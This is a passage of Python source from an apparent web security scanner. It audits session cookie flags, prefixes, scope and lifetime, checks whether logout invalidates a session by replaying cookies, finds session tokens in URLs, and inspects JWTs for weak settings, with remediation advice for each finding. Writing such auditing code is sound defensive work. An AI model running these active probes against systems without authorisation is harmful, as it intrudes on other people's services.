            # the attribute and fall back to SameSite=Lax — a misconfiguration.
            _bad_samesite_none.append(_ck.name)

    # Cross-reference authentication_status.json for cookies invisible to the
    # requests jar.  OAuth/OIDC flows often set auth tokens (authToken, idToken,
    # refreshToken) via JavaScript or during redirect callbacks that the requests
    # library doesn't capture.  authentication_status.json records ALL cookies
    # observed during the auth phase, so any cookie present there but absent from
    # auth_sess.cookies was set outside the requests flow.
    _jar_names = {_ck.name for _ck in auth_sess.cookies}
    try:
        _as_path = out.root / "authentication_status.json"
        if _as_path.exists():
            _as_entries = json.loads(_as_path.read_text(encoding="utf-8"))
            for _as_entry in _as_entries:
                if _as_entry.get("role") in ("unauthenticated", ""):
                    continue
                for _as_ck in _as_entry.get("cookies", []):
                    _as_name = _as_ck.get("name", "")
                    if not _as_name or _as_name in _jar_names:
                        continue  # already audited via jar
                    if _INFRA_COOKIE_RE.match(_as_name):
                        continue
                    if _TRACKING_COOKIE_RE.match(_as_name):
                        continue
                    _jar_names.add(_as_name)  # avoid duplicates across roles
                    if not _as_ck.get("secure", True):
                        _miss_secure.append(_as_name)
                    if not _as_ck.get("httpOnly", True):
                        _miss_httponly.append(_as_name)
                    # SameSite is not reliably captured in authentication_status
                    # (requests can't read SameSite from the jar) — skip for
                    # auth_status-only cookies to avoid false positives.
    except Exception:
        pass

    # Build evidence file with full cookie flag details for all findings
    _ck_evidence = out.output_path(phase, "cookie_flags_" + hostname)
    try:
        _ck_lines = [f"# Cookie Security Flag Audit — {url}\n"]
        for _ck in auth_sess.cookies:
            _ho = False
            try:
                _ho = _ck.has_nonstandard_attr("HttpOnly")
            except Exception:
                try:
                    _ho = "HttpOnly" in (_ck._rest or {})
                except Exception:
                    pass
            _ss = ""
            try:
                _ss = ((_ck._rest or {}).get("SameSite") or "").strip()
            except Exception:
                pass
            _ck_lines.append(
                f"  {_ck.name:40s}  Secure={_ck.secure!s:5s}  "
                f"HttpOnly={_ho!s:5s}  SameSite={_ss or '(absent)':10s}  "
                f"Domain={_ck.domain}  Path={_ck.path}"
            )
        _ck_evidence.write_text("\n".join(_ck_lines) + "\n", encoding="utf-8")
    except Exception:
        pass
    _ck_ev_str = str(_ck_evidence)

    if _miss_secure:
        out.add_finding(
            title="Session Cookie Missing Secure Flag",
            url=url, port=target["port"], risk="MEDIUM",
            description=(
                f"The following session cookie(s) are transmitted without the Secure "
                f"flag: {', '.join(_miss_secure)}. "
                f"Without Secure, the cookie is sent over unencrypted HTTP connections, "
                f"making it vulnerable to interception by a network-level attacker."
            ),
            output=f"Cookies without Secure: {', '.join(_miss_secure)}",
            sources="fracture-session", service=target["scheme"],
            affected=url, output_file=_ck_ev_str,
            owasp="A02:2025 Cryptographic Failures",
            nist="SC-8",
            remediation=(
                "Set the Secure attribute on all session and auth cookies. "
                "Enforce HTTPS at the application and infrastructure level."
            ),
        )
        vc.log(f"[session] Missing Secure flag: {', '.join(_miss_secure)}", "SUCCESS")

    if _miss_httponly:
        out.add_finding(
            title="Session Cookie Missing HttpOnly Flag",
            url=url, port=target["port"], risk="MEDIUM",
            description=(
                f"The following cookie(s) lack the HttpOnly attribute: "
                f"{', '.join(_miss_httponly)}. "
                f"Without HttpOnly, JavaScript running in the browser (e.g. via XSS) "
                f"can read the cookie value with document.cookie, enabling session hijacking."
            ),
            output=f"Cookies without HttpOnly: {', '.join(_miss_httponly)}",
            sources="fracture-session", service=target["scheme"],
            affected=url, output_file=_ck_ev_str,
            owasp="A07:2025 Identification and Authentication Failures",
            nist="SC-23",
            remediation=(
                "Set the HttpOnly attribute on all session and authentication cookies. "
                "Cookies used purely by client-side JavaScript do not require HttpOnly, "
                "but session identifiers always should."
            ),
        )
        vc.log(f"[session] Missing HttpOnly flag: {', '.join(_miss_httponly)}", "SUCCESS")

    if _miss_samesite:
        out.add_finding(
            title="Session Cookie Missing SameSite Attribute",
            url=url, port=target["port"], risk="MEDIUM",
            description=(
                f"The following cookie(s) have no SameSite attribute: "
                f"{', '.join(_miss_samesite)}. "
                f"Without SameSite, cookies are sent with cross-site requests, "
                f"leaving the application reliant solely on CSRF tokens for protection. "
                f"Modern browsers default to SameSite=Lax but this cannot be relied upon "
                f"for all clients."
            ),
            output=f"Cookies without SameSite: {', '.join(_miss_samesite)}",
            sources="fracture-session", service=target["scheme"],
            affected=url, output_file=_ck_ev_str,
            owasp="A04:2025 Insecure Design",
            nist="SI-10",
            remediation=(
                "Add SameSite=Strict or SameSite=Lax to all session cookies. "
                "Use SameSite=None only for cookies that must be sent cross-origin, "
                "and only in combination with the Secure flag."
            ),
        )
        vc.log(f"[session] Missing SameSite: {', '.join(_miss_samesite)}", "SUCCESS")

    if _bad_samesite_none:
        out.add_finding(
            title="Session Cookie SameSite=None Without Secure Flag",
            url=url, port=target["port"], risk="MEDIUM",
            description=(
                f"The following cookie(s) are set with SameSite=None but without "
                f"the Secure flag: {', '.join(_bad_samesite_none)}. "
                f"The SameSite=None attribute requires Secure — modern browsers will "
                f"reject or ignore SameSite=None on non-HTTPS responses, and the cookie "
                f"will be sent over unencrypted connections."
            ),
            output=f"Cookies with SameSite=None but no Secure: {', '.join(_bad_samesite_none)}",
            sources="fracture-session", service=target["scheme"],
            affected=url, output_file=_ck_ev_str,
            owasp="A02:2025 Cryptographic Failures",
            nist="SC-8",
            remediation=(
                "Add the Secure flag to all SameSite=None cookies. "
                "If the Secure flag cannot be added, change SameSite to Lax or Strict."
            ),
        )
        vc.log(
            f"[session] SameSite=None without Secure: {', '.join(_bad_samesite_none)}",
            "SUCCESS"
        )

    if not any((_miss_secure, _miss_httponly, _miss_samesite, _bad_samesite_none)):
        vc.log("[session] Cookie security flags: all checked cookies appear correctly configured",
               "INFO")

    # 4b. __Host- / __Secure- cookie prefix validation (RFC 6265bis §4.1.3)
    vc.status(phase, "Session Analysis", "running", "Cookie prefix validation", 3, 13)
    _bad_host_prefix:   list = []
    _bad_secure_prefix: list = []
    for _ck in auth_sess.cookies:
        if _INFRA_COOKIE_RE.match(_ck.name):
            continue
        if _TRACKING_COOKIE_RE.match(_ck.name):
            continue
        if _ck.name.startswith("__Host-"):
            _prefix_ok = True
            if not _ck.secure:
                _prefix_ok = False
            if _ck.domain and not _ck.domain.startswith("."):
                pass
            elif _ck.domain and _ck.domain.startswith("."):
                _prefix_ok = False
            if _ck.path != "/":
                _prefix_ok = False
            if not _prefix_ok:
                _bad_host_prefix.append(_ck.name)
        elif _ck.name.startswith("__Secure-"):
            if not _ck.secure:
                _bad_secure_prefix.append(_ck.name)

    if _bad_host_prefix:
        out.add_finding(
            title="__Host- Cookie Prefix Requirements Not Met",
            url=url, port=target["port"], risk="MEDIUM",
            description=(
                f"The following cookie(s) use the __Host- prefix but violate its "
                f"requirements: {', '.join(_bad_host_prefix)}. "
                f"__Host- cookies MUST set Secure, MUST NOT set a Domain attribute, "
                f"and MUST set Path=/. When these requirements are not met, the "
                f"prefix provides no protection against cookie injection attacks from "
                f"subdomains or insecure pages."
            ),
            output=f"Non-compliant __Host- cookies: {', '.join(_bad_host_prefix)}",
            sources="fracture-session", service=target["scheme"],
            affected=url, output_file=_ck_ev_str,
            owasp="A07:2025 Identification and Authentication Failures",
            nist="SC-23",
            remediation=(
                "Ensure all __Host- prefixed cookies set the Secure flag, omit the "
                "Domain attribute, and set Path=/. If these requirements cannot be met, "
                "remove the __Host- prefix and rely on standard cookie hardening."
            ),
        )
        vc.log(f"[session] __Host- prefix violation: {', '.join(_bad_host_prefix)}", "SUCCESS")

    if _bad_secure_prefix:
        out.add_finding(
            title="__Secure- Cookie Prefix Without Secure Flag",
            url=url, port=target["port"], risk="MEDIUM",
            description=(
                f"The following cookie(s) use the __Secure- prefix but lack the "
                f"Secure flag: {', '.join(_bad_secure_prefix)}. "
                f"__Secure- cookies MUST set the Secure attribute. Without it, the "
                f"prefix has no effect and the cookie may be sent over plaintext HTTP."
            ),
            output=f"Non-compliant __Secure- cookies: {', '.join(_bad_secure_prefix)}",
            sources="fracture-session", service=target["scheme"],
            affected=url, output_file=_ck_ev_str,
            owasp="A02:2025 Cryptographic Failures",
            nist="SC-8",
            remediation=(
                "Add the Secure attribute to all __Secure- prefixed cookies. "
                "If HTTPS cannot be enforced, remove the __Secure- prefix."
            ),
        )
        vc.log(f"[session] __Secure- prefix violation: {', '.join(_bad_secure_prefix)}", "SUCCESS")

    # 4c. Cookie scope / domain overly-broad check
    vc.status(phase, "Session Analysis", "running", "Cookie domain scope", 3, 13)
    _target_host = urllib.parse.urlparse(url).hostname or ""
    _target_parts = _target_host.split(".")
    _broad_domain_cookies: list = []
    for _ck in auth_sess.cookies:
        if _INFRA_COOKIE_RE.match(_ck.name):
            continue
        if _TRACKING_COOKIE_RE.match(_ck.name):
            continue
        _ck_domain = (_ck.domain or "").lstrip(".")
        if not _ck_domain:
            continue
        _ck_parts = _ck_domain.split(".")
        if len(_ck_parts) < len(_target_parts) and _target_host.endswith(_ck_domain):
            _broad_domain_cookies.append(f"{_ck.name} (Domain=.{_ck_domain})")

    if _broad_domain_cookies:
        out.add_finding(
            title="Cookie Domain Scope Overly Broad",
            url=url, port=target["port"], risk="LOW",
            description=(
                f"The following cookie(s) are scoped to a parent domain broader than "
                f"the application host ({_target_host}): "
                f"{', '.join(_broad_domain_cookies)}. "
                f"Overly-broad domain scoping means every subdomain under that domain "
                f"receives the cookie, expanding the attack surface. A compromised "
                f"sibling application could read session tokens."
            ),
            output=f"Overly-broad cookies: {', '.join(_broad_domain_cookies)}",
            sources="fracture-session", service=target["scheme"],
            affected=url, output_file=_ck_ev_str,
            owasp="A07:2025 Identification and Authentication Failures",
            nist="SC-23",
            remediation=(
                f"Scope session cookies to the specific application host ({_target_host}) "
                f"by omitting the Domain attribute or setting it to the exact FQDN. "
                f"Avoid setting Domain to a parent domain unless cross-subdomain "
                f"sharing is explicitly required."
            ),
        )
        vc.log(f"[session] Overly-broad domain: {', '.join(_broad_domain_cookies)}", "SUCCESS")

    # 4d. Cookie expiration / Max-Age analysis
    vc.status(phase, "Session Analysis", "running", "Cookie expiration", 3, 13)
    _EXCESSIVE_LIFETIME_DAYS = 365
    _persistent_session_cookies: list = []
    _excessive_lifetime_cookies: list = []
    _session_like_re = re.compile(
        r'(?:sess|token|auth|jwt|sid|login|identity|access)',
        re.IGNORECASE
    )
    for _ck in auth_sess.cookies:
        if _INFRA_COOKIE_RE.match(_ck.name):
            continue
        if _TRACKING_COOKIE_RE.match(_ck.name):
            continue
        if not _session_like_re.search(_ck.name):
            continue
        if _ck.expires is not None and _ck.expires > 0:
            _ck_lifetime_days = (_ck.expires - time.time()) / 86400
            if _ck_lifetime_days > _EXCESSIVE_LIFETIME_DAYS:
                _excessive_lifetime_cookies.append(
                    f"{_ck.name} ({int(_ck_lifetime_days)}d)"
                )
            elif _ck_lifetime_days > 1:
                _persistent_session_cookies.append(
                    f"{_ck.name} ({int(_ck_lifetime_days)}d)"
                )

    if _excessive_lifetime_cookies:
        out.add_finding(
            title="Session Cookie With Excessive Lifetime",
            url=url, port=target["port"], risk="LOW",
            description=(
                f"The following session-related cookie(s) have an expiration exceeding "
                f"{_EXCESSIVE_LIFETIME_DAYS} days: "
                f"{', '.join(_excessive_lifetime_cookies)}. "
                f"Long-lived session cookies widen the window for session hijacking "
                f"via stolen cookies. If the cookie is compromised, the attacker "
                f"can use it for an extended period."
            ),
            output=f"Excessive-lifetime cookies: {', '.join(_excessive_lifetime_cookies)}",
            sources="fracture-session", service=target["scheme"],
            affected=url, output_file=_ck_ev_str,
            owasp="A07:2025 Identification and Authentication Failures",
            nist="AC-12",
            remediation=(
                "Set session cookie expiration to the minimum necessary for the "
                "application's session requirements. For high-security applications, "
                "prefer session cookies (no Expires/Max-Age) that expire when the "
                "browser closes, or limit lifetime to 8-24 hours."
            ),
        )
        vc.log(
            f"[session] Excessive cookie lifetime: {', '.join(_excessive_lifetime_cookies)}",
            "SUCCESS"
        )

    # 4e. Cookie Path attribute — flag session cookies with Path=/
    vc.status(phase, "Session Analysis", "running", "Cookie path scope", 3, 13)
    _broad_path_cookies: list = []
    _app_root_path = urllib.parse.urlparse(url).path or "/"
    _app_root_path = _app_root_path.rstrip("/") or "/"
    if _app_root_path != "/":
        for _ck in auth_sess.cookies:
            if _INFRA_COOKIE_RE.match(_ck.name):
                continue
            if _TRACKING_COOKIE_RE.match(_ck.name):
                continue
            if not _session_like_re.search(_ck.name):
                continue
            if (_ck.path or "/") == "/" and _app_root_path != "/":
                _broad_path_cookies.append(_ck.name)

    if _broad_path_cookies:
        out.add_finding(
            title="Session Cookie Path Not Restricted to Application Root",
            url=url, port=target["port"], risk="INFO",
            description=(
                f"The following session cookie(s) use Path=/ even though the "
                f"application is served from {_app_root_path}: "
                f"{', '.join(_broad_path_cookies)}. "
                f"A Path=/ cookie is accessible to all paths on the host, including "
                f"other applications that may share the same origin."
            ),
            output=f"Broad-path cookies: {', '.join(_broad_path_cookies)}",
            sources="fracture-session", service=target["scheme"],
            affected=url, output_file=_ck_ev_str,
            owasp="A04:2025 Insecure Design",
            nist="SC-23",
            remediation=(
                f"Set the cookie Path attribute to the application root "
                f"({_app_root_path}) to limit cookie exposure to only the paths "
                f"that need it."
            ),
        )
        vc.log(f"[session] Broad Path=/ cookies: {', '.join(_broad_path_cookies)}", "SUCCESS")

    vc.status(phase, "Session Analysis", "running", "Logout invalidation", 4, 13)
    # 5. Check logout invalidation
    # IMPORTANT: Never use auth_sess itself for logout probing — hitting /logout
    # on the live session object invalidates the server-side session and breaks all
    # subsequent authenticated phases.  Use two disposable clones instead:
    #   logout_probe  — hits the logout endpoint (expendable)
    #   old_sess      — tests whether the pre-logout cookies still work
    logout_paths = ["/logout", "/signout", "/auth/logout", "/session/destroy", "/api/logout"]
    for lpath in logout_paths:
        try:
            # Clone auth_sess cookies into a disposable probe session
            pre_cookies = dict(auth_sess.cookies)
            logout_probe = _make_session(cfg)
            for k, v in pre_cookies.items():
                logout_probe.cookies.set(k, v)
            r = logout_probe.get(url + lpath, timeout=timeout, allow_redirects=False)
            if r.status_code in (200, 302):
                # Save logout request + response evidence
                _logout_rq, _logout_rp = _save_http_evidence(
                    out, phase, f"logout_request_{hostname}", r)
                # Try to use old session cookies to confirm server-side invalidation
                old_sess = _make_session(cfg)
                for k, v in pre_cookies.items():
                    old_sess.cookies.set(k, v)
                r2 = old_sess.get(url, timeout=timeout)
                # Save the follow-up protected-endpoint request + response too
                _follow_rq, _follow_rp = _save_http_evidence(
                    out, phase, f"logout_followup_{hostname}", r2)
                # SPA-aware: if the follow-up body is identical to an
                # unauth request (same normalized hash), the 200 is just
                # the SPA shell — not proof the session is still valid.
                _logout_spa_shell = False
                try:
                    _logout_unauth = _make_session(cfg)
                    _logout_ur = _logout_unauth.get(url, timeout=timeout)
                    if (_logout_ur and _logout_ur.status_code == 200
                            and r2.status_code == 200):
                        if (_p20_body_hash((_logout_ur.text or "").strip())
                                == _p20_body_hash((r2.text or "").strip())):
                            _logout_spa_shell = True
                except Exception:
                    pass
                if (r2.status_code == 200
                        and not _logout_spa_shell
                        and not re.search(r'login|sign.?in|auth', r2.url, re.I)
                        and not _matches_error_fingerprint(r2.text)
                        and not _response_is_error_page(r2.text)):
                    # Evidence: 4 saved files — logout req, logout resp,
                    # follow-up req, follow-up resp. Pass them as a JSON-
                    # array of HTTP-exchange dicts so Crucible's Evidence
                    # modal renders the multi-tab viewer correctly.
                    _evidence = json.dumps([
                        {"url": url + lpath,
                         "req": str(_logout_rq),
                         "resp": str(_logout_rp)},
                        {"url": r2.url or url,
                         "req": str(_follow_rq),
                         "resp": str(_follow_rp)},
                    ])
                    out.add_finding(
                        title="Session Not Invalidated After Logout",
                        url=url + lpath, port=target["port"], risk="HIGH",
                        description=(
                            "Session cookies remain valid after the logout "
                            "endpoint was called. The same cookies still "
                            "authorise access to a protected page, meaning "
                            "the server did not invalidate the session "
                            "record on logout — only the client-side cookie "
                            "removal happened. Recovered cookies (browser "
                            "history, XSS, MITM, malware) can be replayed "
                            "indefinitely until natural session timeout."
                        ),
                        output=(
                            f"Logout endpoint:        {url + lpath}\n"
                            f"Logout response:        HTTP {r.status_code}\n"
                            f"Follow-up request:      GET {r2.url}\n"
                            f"Follow-up response:     HTTP {r2.status_code}\n"
                            f"Final URL after redirect: {r2.url}\n"
                            f"Evidence files saved (logout + follow-up req/resp): 4"
                        ),
                        sources="fracture-session", service=target["scheme"],
                        output_file=_evidence,
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="SC-23",
                        remediation=(
                            "Invalidate the session server-side on logout "
                            "(remove the session record from the store, do "
                            "not just unset the Set-Cookie header). Do not "
                            "rely on client-side cookie deletion."
                        ),
                        http_code=r2.status_code,
                    )
                    vc.log("[session] Session not invalidated after logout", "SUCCESS")
                elif _logout_spa_shell:
                    vc.log("[session] Post-logout follow-up returned SPA shell "
                           "(same body as unauth) — cannot determine session "
                           "validity from HTML response alone", "INFO")
            break
        except Exception:
            pass

    # ── Step 5: Session Token in URL — WSTG-SESS-04 ──────────────────────
    vc.status(phase, "Session Analysis", "running", "Session token in URL", 5, 13)
    vc.log(f"[session] Testing session token in URL for {hostname}", "INFO")
    _SESS_URL_PARAM_RE = re.compile(
        r'(?i)(jsessionid|phpsessid|aspsessionid|sid|session_?id|'
        r'sess_?id|token|auth_?token|access_?token|stoken)', re.I)
    try:
        _url_r = auth_sess.get(url, timeout=timeout, allow_redirects=True)
        _final_url = _url_r.url or url
        _parsed_final = urllib.parse.urlparse(_final_url)
        _url_params = urllib.parse.parse_qs(_parsed_final.query)
        _leaked_params = [p for p in _url_params if _SESS_URL_PARAM_RE.search(p)]
        if _leaked_params:
            _url_ev = ""
            try:
                _url_ev_path = out.output_path(phase, f"session_in_url_{hostname}")
                _url_ev_path.write_text(
                    f"Session Token in URL Analysis\n"
                    f"Final URL: {_final_url}\n"
                    f"Leaked parameters: {', '.join(_leaked_params)}\n"
                    f"Values: {json.dumps({p: _url_params[p] for p in _leaked_params}, indent=2)}\n",
                    encoding="utf-8")
                _url_ev = str(_url_ev_path)
            except Exception:
                pass
            out.add_finding(
                title="Session Token Exposed in URL",
                url=_final_url, port=target["port"], risk="MEDIUM",
                description=(
                    f"Session-related parameter(s) ({', '.join(_leaked_params)}) appear in "
                    f"the URL query string. Tokens in URLs leak through browser history, "
                    f"Referer headers, proxy logs, and server access logs, enabling session "
                    f"hijacking without direct access to the victim's browser."
                ),
                output=f"URL: {_final_url}\nLeaked params: {', '.join(_leaked_params)}",
                sources="fracture-session", service=target["scheme"],
                output_file=_url_ev,
                owasp="A07:2025 Identification and Authentication Failures",
                nist="SC-23",
                cwe=["CWE-598"],
                remediation=(
                    "Transmit session tokens only via cookies (with Secure, HttpOnly, "
                    "SameSite attributes) or Authorization headers. Never embed session "
                    "identifiers in URL query parameters or path segments."
                ),
            )
            vc.log(f"[session] Session token in URL: {', '.join(_leaked_params)}", "SUCCESS")
        else:
            # Also scan page body for links containing session tokens
            _body_links = re.findall(r'href=["\']([^"\']*)["\']', (_url_r.text or "")[:50000])
            _body_leaked = []
            for _bl in _body_links[:100]:
                _bl_parsed = urllib.parse.urlparse(_bl)
                _bl_params = urllib.parse.parse_qs(_bl_parsed.query)
                for _bp in _bl_params:
                    if _SESS_URL_PARAM_RE.search(_bp):
                        _body_leaked.append((_bl, _bp))
                        break
            if _body_leaked:
                _bl_ev = ""
                try:
                    _bl_ev_path = out.output_path(phase, f"session_in_body_links_{hostname}")
                    _bl_ev_path.write_text(
                        f"Session Tokens in Body Links\n"
                        + "\n".join(f"  {bl[0]} -> param={bl[1]}" for bl in _body_leaked[:10])
                        + "\n", encoding="utf-8")
                    _bl_ev = str(_bl_ev_path)
                except Exception:
                    pass
                out.add_finding(
                    title="Session Token in Page Links",
                    url=url, port=target["port"], risk="MEDIUM",
                    description=(
                        f"Page links embed session tokens in URL query parameters. "
                        f"Found {len(_body_leaked)} link(s) with session-like parameters "
                        f"in href attributes. These leak through Referer headers when "
                        f"users navigate to external sites."
                    ),
                    output="\n".join(f"Link: {bl[0]} (param: {bl[1]})" for bl in _body_leaked[:5]),
                    sources="fracture-session", service=target["scheme"],
                    output_file=_bl_ev,
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="SC-23",
                    cwe=["CWE-598"],
                    remediation=(
                        "Remove session tokens from all hyperlinks. Use cookie-based "
                        "session management exclusively. Set Referrer-Policy to "
                        "no-referrer or same-origin."
                    ),
                )
                vc.log(f"[session] Session tokens found in {len(_body_leaked)} body links", "SUCCESS")
            else:
                vc.log("[session] No session tokens found in URLs or body links", "INFO")
    except Exception:
        vc.log("[session] Session token in URL check failed (request error)", "WARN")

    # ── Step 6: Cookie Scope Audit — WSTG-SESS-02 ─────────────────────
    vc.status(phase, "Session Analysis", "running", "Cookie scope audit", 6, 13)
    vc.log(f"[session] Auditing cookie scope for {hostname}", "INFO")
    try:
        _target_domain = hostname.lower()
        _target_path = urllib.parse.urlparse(url).path or "/"
        _broad_domain_cookies = []
        _broad_path_cookies = []
        for cookie in auth_sess.cookies:
            if _INFRA_COOKIE_RE.match(cookie.name):
                continue
            # Domain scope check
            _ck_domain = (cookie.domain or "").lower().lstrip(".")
            if _ck_domain and _ck_domain != _target_domain:
                # Cookie domain is broader than target (parent domain)
                if _target_domain.endswith("." + _ck_domain):
                    _broad_domain_cookies.append((cookie.name, _ck_domain))
            # Path scope check
            _ck_path = cookie.path or "/"
            if (_ck_path == "/" and _target_path != "/"
                    and len(_target_path) > 1):
                _broad_path_cookies.append((cookie.name, _ck_path))
        if _broad_domain_cookies:
            _scope_ev = ""
            try:
                _scope_ev_path = out.output_path(phase, f"cookie_scope_{hostname}")
                _scope_ev_path.write_text(
                    f"Cookie Scope Audit\nTarget: {_target_domain}\n"
                    + "\n".join(f"  {n}: Domain=.{d}" for n, d in _broad_domain_cookies)
                    + "\n", encoding="utf-8")
                _scope_ev = str(_scope_ev_path)
            except Exception:
                pass
            out.add_finding(
                title="Overly Broad Cookie Domain Scope",
                url=url, port=target["port"], risk="LOW",
                description=(
                    f"Session cookie(s) are scoped to a parent domain rather than "
                    f"the application's specific hostname ({_target_domain}). "
                    f"Cookies: {', '.join(n for n, _ in _broad_domain_cookies)}. "
                    f"This allows any subdomain under the parent to read these cookies, "
                    f"increasing the attack surface for session hijacking via "
                    f"compromised sibling applications."
                ),
                output="\n".join(
                    f"Cookie: {n}, Domain: .{d}" for n, d in _broad_domain_cookies),
                sources="fracture-session", service=target["scheme"],
                output_file=_scope_ev,
                owasp="A07:2025 Identification and Authentication Failures",
                nist="SC-23",
                cwe=["CWE-1275"],
                remediation=(
                    "Set the cookie Domain attribute to the exact hostname of the "
                    "application. Avoid using parent domain cookies unless required "
                    "for cross-subdomain SSO."
                ),
            )
            vc.log(f"[session] Broad domain scope: {', '.join(n for n, _ in _broad_domain_cookies)}", "SUCCESS")
        if _broad_path_cookies and _target_path != "/":
            out.add_finding(
                title="Cookie Path Scoped to Root",
                url=url, port=target["port"], risk="INFO",
                description=(
                    f"Session cookie(s) use Path=/ while the application appears to "
                    f"reside at {_target_path}. Cookies: "
                    f"{', '.join(n for n, _ in _broad_path_cookies)}. Other applications "
                    f"on the same hostname can read these cookies."
                ),
                output="\n".join(
                    f"Cookie: {n}, Path: {p}" for n, p in _broad_path_cookies),
                sources="fracture-session", service=target["scheme"],
                owasp="A07:2025 Identification and Authentication Failures",
                nist="SC-23",
                remediation=(
                    f"Set the cookie Path attribute to '{_target_path}' to limit "
                    f"cookie visibility to the application's URL space."
                ),
            )
            vc.log(f"[session] Root-path cookies: {', '.join(n for n, _ in _broad_path_cookies)}", "SUCCESS")
        if not _broad_domain_cookies and not _broad_path_cookies:
            vc.log("[session] Cookie scope audit: all cookies properly scoped", "INFO")
    except Exception:
        vc.log("[session] Cookie scope audit failed", "WARN")

    # ── Step 7: CSRF Token Validation — WSTG-SESS-05 ──────────────────
    # NOTE: Full CSRF token validation (tampered/missing token submission)
    # is tested in the dedicated Advanced CSRF phase. Skip here to avoid
    # duplicate findings and unnecessary requests.
    vc.status(phase, "Session Analysis", "running", "CSRF token validation", 7, 13)
    vc.log("[session] CSRF token validation covered in dedicated CSRF phase — skipped", "INFO")

    # ── Step 8: JWT Analysis — WSTG-SESS-01 ────────────────────────────
    vc.status(phase, "Session Analysis", "running", "JWT analysis", 8, 13)
    vc.log(f"[session] Analysing JWT tokens for {hostname}", "INFO")
    _JWT_RE = re.compile(r'^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$')
    def _jwt_b64_decode(segment):
        padded = segment + "=" * (4 - len(segment) % 4)
        return json.loads(base64.urlsafe_b64decode(padded))
    _jwt_candidates = []
    for cookie in auth_sess.cookies:
        if _JWT_RE.match(cookie.value or ""):
            _jwt_candidates.append(("cookie", cookie.name, cookie.value))
    _auth_hdr = ""
    for _hdr_name in ("Authorization", "authorization"):
        _auth_hdr = auth_sess.headers.get(_hdr_name, "")
        if _auth_hdr:
            break
    if _auth_hdr.startswith("Bearer "):
        _bearer_tok = _auth_hdr[7:]
        if _JWT_RE.match(_bearer_tok):
            _jwt_candidates.append(("header", "Authorization", _bearer_tok))
    for _jwt_src, _jwt_name, _jwt_val in _jwt_candidates:
        try:
            _parts = _jwt_val.split(".")
            _header = _jwt_b64_decode(_parts[0])
            _payload = _jwt_b64_decode(_parts[1])
            _jwt_alg = _header.get("alg", "").lower()
            _jwt_ev = ""
            try:
                _jwt_ev_path = out.output_path(phase, f"jwt_{_jwt_name}_{hostname}")
                _jwt_ev_path.write_text(
                    f"JWT Analysis\nSource: {_jwt_src} ({_jwt_name})\n"
                    f"Header: {json.dumps(_header, indent=2)}\n"
                    f"Payload: {json.dumps(_payload, indent=2)}\n",
                    encoding="utf-8")
                _jwt_ev = str(_jwt_ev_path)
            except Exception:
                pass

            # Check 1: alg=none
            if _jwt_alg in ("none", ""):
                out.add_finding(
                    title="JWT Algorithm None Accepted",
                    url=url, port=target["port"], risk="CRITICAL",
                    description=(
                        f"JWT in {_jwt_src} '{_jwt_name}' uses algorithm '{_header.get('alg', 'none')}'. "
                        f"The 'none' algorithm means the token has no signature verification, "
                        f"allowing any attacker to forge arbitrary tokens."
                    ),
                    output=f"Source: {_jwt_src} ({_jwt_name})\nAlgorithm: {_header.get('alg', 'none')}\nHeader: {json.dumps(_header)}",
                    sources="fracture-session", service=target["scheme"],
                    output_file=_jwt_ev,
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="IA-5",
                    cwe=["CWE-345", "CWE-327"],
                    remediation=(
                        "Enforce a strong signing algorithm (RS256, ES256) server-side. "
                        "Reject tokens with alg=none. Use an allowlist of accepted algorithms."
                    ),
                )
                vc.log(f"[session] JWT alg=none in {_jwt_src} '{_jwt_name}'", "SUCCESS")

            # Check 2: Missing exp claim
            if "exp" not in _payload:
                out.add_finding(
                    title="JWT Missing Expiration Claim",
                    url=url, port=target["port"], risk="MEDIUM",
                    description=(
                        f"JWT in {_jwt_src} '{_jwt_name}' has no 'exp' (expiration) claim. "
                        f"Without expiration, a stolen token remains valid indefinitely, "
                        f"eliminating the time-limited nature of token-based authentication."
                    ),
                    output=f"Source: {_jwt_src} ({_jwt_name})\nPayload keys: {list(_payload.keys())}",
                    sources="fracture-session", service=target["scheme"],
                    output_file=_jwt_ev,
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="IA-5",
                    cwe=["CWE-613"],
                    remediation=(
                        "Include an 'exp' claim in all JWTs with a reasonable lifetime "
                        "(15 minutes for access tokens, hours for refresh tokens). "
                        "Validate expiration server-side on every request."
                    ),
                )
                vc.log(f"[session] JWT missing exp in {_jwt_src} '{_jwt_name}'", "SUCCESS")
            elif "exp" in _payload:
                # Check 3: Excessive lifetime
                import time as _jwt_time
                _exp_val = _payload.get("exp", 0)
                _iat_val = _payload.get("iat", 0)
                if _iat_val and _exp_val:
                    _lifetime_secs = _exp_val - _iat_val
                    _lifetime_hrs = _lifetime_secs / 3600
                    if _lifetime_hrs > 24:
                        _risk = "MEDIUM" if _lifetime_hrs > 720 else "LOW"
                        out.add_finding(
                            title="JWT Excessive Lifetime",
                            url=url, port=target["port"], risk=_risk,
                            description=(
                                f"JWT in {_jwt_src} '{_jwt_name}' has a lifetime of "
                                f"{_lifetime_hrs:.1f} hours ({_lifetime_secs} seconds). "
                                f"Long-lived tokens increase the window for token theft "
                                f"and replay attacks."
                            ),
                            output=(
                                f"Source: {_jwt_src} ({_jwt_name})\n"
                                f"iat: {_iat_val}\nexp: {_exp_val}\n"
                                f"Lifetime: {_lifetime_hrs:.1f} hours"
                            ),
                            sources="fracture-session", service=target["scheme"],
                            output_file=_jwt_ev,
                            owasp="A07:2025 Identification and Authentication Failures",
                            nist="AC-12",
                            cwe=["CWE-613"],
                            remediation=(
                                "Reduce JWT lifetime to 15-60 minutes for access tokens. "
                                "Use refresh tokens for session continuity. Implement "
                                "token revocation for compromised tokens."
                            ),
                        )
                        vc.log(f"[session] JWT excessive lifetime: {_lifetime_hrs:.1f}h in {_jwt_name}", "SUCCESS")

            # Check 4: Sensitive data in payload
            _sensitive_keys = {"password", "passwd", "pwd", "secret", "ssn",
                               "credit_card", "cc_number", "cvv"}
            _found_sensitive = [k for k in _payload if k.lower() in _sensitive_keys]
            if _found_sensitive:
                out.add_finding(
                    title="JWT Contains Sensitive Data",
                    url=url, port=target["port"], risk="MEDIUM",
                    description=(
                        f"JWT in {_jwt_src} '{_jwt_name}' payload contains sensitive "
                        f"field(s): {', '.join(_found_sensitive)}. JWT payloads are "
                        f"base64url-encoded (not encrypted) and readable by anyone "
                        f"with access to the token."
                    ),
